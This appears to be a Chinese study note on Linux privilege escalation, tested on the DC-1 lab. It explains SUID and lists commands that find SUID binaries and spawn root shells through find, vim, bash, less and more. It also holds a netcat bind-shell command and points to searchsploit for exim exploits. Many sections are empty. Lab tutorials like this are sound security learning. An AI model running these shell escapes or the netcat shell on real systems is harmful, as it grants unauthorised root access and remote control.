- [基础概念](#基础概念)
- [基础信息收集](#基础信息收集)
- [提权操作](#提权操作)
  - [SUID提权](#suid提权)
    - [利用find命令提权](#利用find命令提权)
    - [利用nmap](#利用nmap)
    - [利用git](#利用git)
    - [利用vim/vi](#利用vimvi)
    - [利用bash](#利用bash)
    - [利用less](#利用less)
    - [利用more](#利用more)
    - [利用nmap](#利用nmap-1)
    - [利用exim4](#利用exim4)
  - [利用内核漏洞](#利用内核漏洞)
  - [利用root无密码执行](#利用root无密码执行)
  - [利用环境变量](#利用环境变量)
  - [利用存在漏洞的命令](#利用存在漏洞的命令)
  - [利用第三方服务提权](#利用第三方服务提权)
- [参考链接](#参考链接)


# 基础概念

# 基础信息收集

# 提权操作
## SUID提权

**suid:Set owner User ID up on execution**

SUID是一种**对二进制程序进行设置的特殊权限**，可以让二进制程序的执行者**临时**拥有属主的权限（仅对拥有执行权限的二进制程序有效）。例如，所有用户都可以执行passwd命令来修改自己的用户密码，而用户密码保存在/etc/shadow文件中。仔细查看这个文件就会发现它的默认权限是000，也就是说除了root管理员以外，所有用户都没有查看或编辑该文件的权限。但是，在使用passwd命令时如果加上SUID特殊权限位，就可让普通用户临时获得程序所有者的身份，把变更的密码信息写入到shadow文件中。

当用户在执行程序/文件、命令时，会获取文件的所有者的权限以及所有者的UID和GID。
--》因此可以利用拥有root权限的文件，来获取root权限

查找拥有root权限的suid文件的命令如下,不同系统可能命令不同

```bash
    find / -perm -u=s -type f 2>/dev/null 
    find / -user root -perm -4000-print2>/dev/null 
    find / -user root -perm -4000-exec ls -ldb {} \;
```
命令解释：


* / 表示从文件系统的顶部（根）开始并找到每个目录
* -perm 表示搜索随后的权限
* -u=s表示查找root用户拥有的文件
* -type表示我们正在寻找的文件类型 f 表示常规文件，而不是目录或特殊文件
* 2表示该进程的第二个文件描述符，即stderr（标准错误）
* >表示重定向  
* /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。



常见用于提权的Linux文件有：Nmap, Vim, find, bash, more, less, nano, cp

eg:靶场DC-1中拥有root权限的可执行文件如下：

<img src="images/image-20210318203412742.png" width="67%;" />

### 利用find命令提权

使用靶场：**DC-1**

```bash
    #利用exec命令提权
    mkdir test  #创建test文件夹
    touch test  #或者创建test文件
    find test -exec "whoami" \;  #利用exec查看当前用户，输出root，说明当前命令是以root权限执行的
    find test -exec '/bin/sh' \;  
```

<img src="images/find3.png" width="70%"/>


```bash
    #利用命令反弹提权
    find test -exec netcat -lvp 5555 -e /bin/sh \;
    netcat 服务端IP 5555
```

<img src="images/find1.png" width="70%">
<img src="images/find2.png" width="50%">

### 利用nmap

### 利用git

### 利用vim/vi

```bash
#打开vim，按下ESC
:set shell=/bin/sh
:shell
#其他方式
sudo vim -c '!sh'
```

### 利用bash
```bash
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
```

### 利用less
```bash
less /etc/passwd
!/bin/sh
```

### 利用more
```bash
more /home/pelle/myfile
!/bin/bash
```

### 利用nmap


### 利用exim4

主要利用exim4爆出来的漏洞来进行提权

kali中`searchsploit exim`可以搜索与exim相关的利用exp，需要先确定exim的版本信息

<img src='images/exim4.png'/>

<img src='images/exim-exploit.png'/>

## 利用内核漏洞

## 利用root无密码执行

## 利用环境变量

## 利用存在漏洞的命令

## 利用第三方服务提权



# 参考链接
- [Linux SUID 提权](https://jlkl.github.io/2020/01/27/Web_15/)
- [Linux提权的简单总结](https://xz.aliyun.com/t/7924#toc-0)

